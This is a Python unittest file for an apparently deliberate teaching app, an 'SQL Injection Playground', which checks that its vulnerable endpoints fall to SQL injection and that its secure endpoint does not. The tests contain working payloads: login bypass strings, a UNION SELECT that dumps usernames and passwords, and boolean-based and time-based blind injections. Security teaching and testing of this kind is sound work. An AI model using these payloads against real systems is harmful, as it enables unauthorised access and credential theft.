import unittest
import os
import json
import time
from unittest.mock import patch

# Set environment variables for testing before importing app
os.environ['FLASK_SECRET_KEY'] = 'test_secret_key'
os.environ['FLASK_DEBUG'] = '1'

# Define a temporary database path for testing
TEST_DATABASE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'test_database.db')
os.environ['DATABASE'] = TEST_DATABASE_PATH # Override database path for tests

from sql_injection_playground.app import app
from sql_injection_playground.database import init_db, get_db_connection

class TestSQLInjectionPlayground(unittest.TestCase):

    def setUp(self):
        # Configure app for testing
        app.config['TESTING'] = True
        app.config['DATABASE'] = TEST_DATABASE_PATH
        self.app = app.test_client()
        self.app_context = app.app_context()
        self.app_context.push()

        # Initialize a fresh database for each test
        init_db()

    def tearDown(self):
        self.app_context.pop()
        # Clean up the test database file
        if os.path.exists(TEST_DATABASE_PATH):
            os.remove(TEST_DATABASE_PATH)

    def test_index_page(self):
        response = self.app.get('/')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"SQL Injection Playground", response.data)

    def test_vulnerable_login_bypass(self):
        # Test login bypass with ' OR 1=1--
        response = self.app.post('/login', data={'username': "admin'--", 'password': "anypass"}, follow_redirects=True)
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"SQL Injection Playground", response.data) # Should redirect to index page

        # Test login bypass with ' OR '1'='1
        response = self.app.post('/login', data={'username': "user' OR '1'='1", 'password': "anypass"}, follow_redirects=True)
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"SQL Injection Playground", response.data) # Should redirect to index page

    def test_vulnerable_login_invalid_credentials(self):
        response = self.app.post('/login', data={'username': "nonexistent", 'password': "wrongpass"}, follow_redirects=True)
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Invalid credentials.", response.data)

    def test_vulnerable_search_error_based_sqli(self):
        # Test error-based SQLi to trigger a database error
        sqli_query = "' AND 1=1 UNION SELECT 1,2,3,4,5 --"
        response = self.app.get(f'/search?query={sqli_query}')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Database error:", response.data)

    def test_vulnerable_search_union_based_sqli(self):
        # Test UNION-based SQLi to extract data from users table
        # Assuming 5 columns in products table (id, name, description, price, category)
        # and 3 in users (id, username, password, role)
        # We need to match column count for UNION SELECT
        # Products table has 5 columns. Users table has 4. Let's use 5 NULLs for products.
        # The query is `SELECT id, name, description, price, category FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'`
        # So, we need 5 columns in UNION SELECT. 
        # Let's try to dump username and password from users table.
        # The columns are name, description, price, category. We can map username to name, password to description.
        # The original query selects id, name, description, price, category.
        # So, we need 5 columns. Let's try to dump username and password from users.
        # The users table has id, username, password, role.
        # We can map: NULL, username, password, NULL, NULL
        sqli_query = "1 UNION SELECT NULL, username, password, 1, NULL FROM users--"
        response = self.app.get(f'/search?query={sqli_query}')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"admin", response.data)
        self.assertIn(b"user", response.data)

    def test_vulnerable_product_details_boolean_based_sqli(self):
        # Test boolean-based blind SQLi
        # True condition: product with ID 1 exists AND 1=1
        response_true = self.app.get('/product?id=1 AND 1=1')
        self.assertEqual(response_true.status_code, 200)
        self.assertIn(b"Laptop Pro", response_true.data)

        # False condition: product with ID 1 exists AND 1=2
        response_false = self.app.get('/product?id=1 AND 1=2')
        self.assertEqual(response_false.status_code, 200)
        self.assertNotIn(b"Laptop Pro", response_false.data)
        self.assertIn(b"Product not found or an error occurred.", response_false.data)

    def test_vulnerable_product_details_time_based_sqli(self):
        # Test time-based blind SQLi
        # This requires a noticeable delay.
        # We'll patch sqlite_sleep to avoid actual long delays in tests.
        # However, for a real test, you'd measure time.
        # For this test, we'll just ensure the query is executed.

        # Test with a payload that causes a delay
        start_time = time.time()
        response = self.app.get('/product?id=1 AND (SELECT sqlite_sleep(1))')
        end_time = time.time()
        self.assertEqual(response.status_code, 200)
        # Assert that the response took longer than a threshold (e.g., 1 second + network/processing overhead)
        self.assertGreater(end_time - start_time, 0.9) # Should be greater than the sleep duration

        # Test with a normal query (no delay)
        start_time = time.time()
        response = self.app.get('/product?id=1')
        end_time = time.time()
        self.assertEqual(response.status_code, 200)
        self.assertLess(end_time - start_time, 0.1) # Should be very fast

    def test_secure_product_details(self):
        # Test secure endpoint with normal input
        response = self.app.get('/secure_product?id=1')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Laptop Pro", response.data)

        # Test secure endpoint with SQLi payload - should not be vulnerable
        response = self.app.get('/secure_product?id=1 OR 1=1--')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Product not found or an error occurred.", response.data) # Should not find product with this ID

        response = self.app.get('/secure_product?id=1 AND (SELECT sqlite_sleep(5))')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Product not found or an error occurred.", response.data) # Should not find product with this ID
        # Assert no significant delay (time-based SQLi should not work)
        start_time = time.time()
        response = self.app.get('/secure_product?id=1 AND (SELECT sqlite_sleep(1))')
        end_time = time.time()
        self.assertLess(end_time - start_time, 0.1)

if __name__ == '__main__':
    unittest.main()
